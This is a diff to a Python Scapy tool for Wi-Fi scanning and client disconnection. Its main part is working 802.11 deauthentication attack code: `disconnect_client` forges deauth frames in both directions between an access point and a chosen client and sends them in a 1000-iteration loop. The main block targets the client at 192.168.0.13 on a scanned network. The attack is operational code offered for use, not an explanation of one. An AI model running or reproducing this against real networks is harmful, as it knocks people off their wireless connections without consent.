@@ -76,15 +76,14 @@ def linux_create_iface_mon(iface=None) -> NetworkInterface:
     set_mode('managed', iface)  # To prevent channel=-1 phenomenon in monitor mode interface
     return next((iface for iface in iface_list if iface.name == iface_mon_name), None)
 
-
 def set_two_ifaces_to_use(iface_man: NetworkInterface, iface_mon: NetworkInterface, iface_list: [NetworkInterface]) -> bool:
     global iface_managed, iface_monitor
     iface_managed = iface_man if isinstance(iface_man, NetworkInterface) else\
-        iface_list[int(iface_man)] if iface_man.isdecimal() else from_name_to_iface(iface_man, iface_list)
-    if iface_mon is None:
+        iface_list[int(iface_man)] if isinstance(iface_man, int) else from_name_to_iface(iface_man, iface_list)
+    if LINUX and iface_mon is None:
         iface_mon = linux_create_iface_mon(iface_managed)
     iface_monitor = iface_mon if isinstance(iface_mon, NetworkInterface) else\
-        iface_list[int(iface_mon)] if iface_mon.isdecimal() else from_name_to_iface(iface_mon, iface_list)
+        iface_list[int(iface_mon)] if isinstance(iface_mon, int) else from_name_to_iface(iface_mon, iface_list)
     if iface_managed is None or iface_monitor is None:
         return False
     set_mode('managed', iface_managed)
@@ -133,27 +132,29 @@ def get_connected_wifi_bssid(iface=None):
 # Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
 #   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
 #   [Output] None
-def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bool = False, iface=None):
+def disconnect_client(network: Network=None, bssid=None, channel=None, client_MAC: str = '', broadcast: bool = False, iface=None) -> bool:
     if iface is None:
         iface = iface_monitor
     if network is None:
         network = connected_network
-
+    if bssid is None or channel is None:
+        bssid = network.bssid
+        channel = network.channel
 
     ack_to_client = 0
     ack_to_AP = 0
-
+    '''
     def handle_deauth_ack(packet):
         nonlocal ack_to_client, ack_to_AP
         if packet.haslayer(Dot11):
             if packet.type == 1 and packet.subtype == 13:
                 if packet.addr1 == client_MAC:
                     ack_to_client += 1
-                elif packet.addr1 == network.bssid:
+                elif packet.addr1 == bssid:
                     ack_to_AP += 1
                 print('Sending 64 directed DeAuth. STMAC: [{}] [C{}|A{} ACKs]'.format(client_MAC, ack_to_client,
                                                                                         ack_to_AP), end='\r')
-
+    '''
     def produce_sc(seq: int, frag: int=0) -> int:
         return (seq << 4) + frag
 
@@ -163,10 +164,10 @@ def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bo
         client_MAC = 'ff:ff:ff:ff:ff:ff'
     '''
     deauth_packet_type1 = (RadioTap(present="Rate+TXFlags", Rate=1, TXFlags=0x0018)
-                           / Dot11(ID=14849, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid, SC=0)
+                           / Dot11(ID=14849, addr1=client_MAC, addr2=bssid, addr3=bssid, SC=0)
                            / Dot11Deauth(reason=7))
     deauth_packet_type2 = (RadioTap(present="TXFlags+b18", notdecoded=b'\x00')
-                     / Dot11(ID=14849, addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
+                     / Dot11(ID=14849, addr1=client_MAC, addr2=bssid, addr3=bssid)
                      / Dot11Deauth(reason=7))
     
     deauth_packet_type1 = from_hexstream_to_packet('00000c000480000002001800c0003a0104292e794a12588694a0b468588694a0b46800000700')
@@ -174,19 +175,19 @@ def disconnect_client(network: Network=None, client_MAC: str = '', broadcast: bo
     '''
     deauth_packet = []
     deauth_packet.append(RadioTap(present='Rate+TXFlags', Rate=1, TXFlags=0x0018)
-                         / Dot11(ID=produce_sc(314), addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
+                         / Dot11(ID=produce_sc(314), addr1=client_MAC, addr2=bssid, addr3=bssid)
                          / Dot11Deauth(reason=7))   # From AP to Client
 
     deauth_packet.append(RadioTap(present='TXFlags+b18', notdecoded=b'\x00')
-                         / Dot11(ID=produce_sc(314), addr1=network.bssid, addr2=client_MAC, addr3=network.bssid)
+                         / Dot11(ID=produce_sc(314), addr1=bssid, addr2=client_MAC, addr3=bssid)
                          / Dot11Deauth(reason=7))   # From Client to AP
-    set_channel(network.channel, iface)
+    set_channel(channel, iface)
     print('[monitor] Sending 100 802.11 Deauthentication Frame to AP and client host... ')
     for i in range(1000):
         deauth_packet[0][Dot11].SC = produce_sc(i)
         deauth_packet[1][Dot11].SC = produce_sc(i)
         sendp(deauth_packet, iface=iface, monitor=True, verbose=False)
-        sniff(iface=iface, monitor=True, timeout=0.001, prn=handle_deauth_ack, store=0)
+        sniff(iface=iface, monitor=True, timeout=0.001, store=0)
     print(f'\n')
     print('[monitor] Done. ')
 
@@ -253,7 +254,7 @@ def set_channel(channel: int, iface=None) -> bool:
 # Scan access points while switching channels in the 2.4GHz and 5GHz bands.
 #   [Input] Channel list for scanning, Frequency('2.4ghz' or '5ghz'), Passive/Active scan, Network interface to use
 #   [Output] List of connectable networks (ssid, bssid, channel, crypto)
-def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = False, iface=None) -> list[Network]:
+def scan_AP(channels: list[int] = None, frequency: str = None, iface=None) -> list[Network]:
     if iface is None:
         iface = iface_monitor
     wifi_2_4_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
@@ -421,5 +422,5 @@ if __name__ == '__main__':
     host_list = scan_host(network=network)
     client_mac = [host.MAC for host in host_list if host.IP == '192.168.0.13'][0]
     disconnect_client(network=network, client_MAC=client_mac)
-    
+
 
